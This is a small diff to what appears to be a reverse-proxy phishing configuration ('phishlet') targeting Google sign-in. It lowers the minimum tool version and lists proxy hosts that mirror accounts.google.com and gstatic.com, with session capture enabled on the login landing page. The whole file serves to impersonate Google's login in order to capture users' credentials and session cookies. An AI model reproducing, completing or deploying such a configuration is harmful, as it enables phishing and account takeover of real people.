@@ -1,6 +1,6 @@
 name: 'google'
 author: '@asmc'
-min_ver: '2.2.1'
+min_ver: '2.2.0'
 proxy_hosts:
   - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: true}
   - {phish_sub: 'ssl', orig_sub: 'ssl', domain: 'gstatic.com', session: false, is_landing: false}
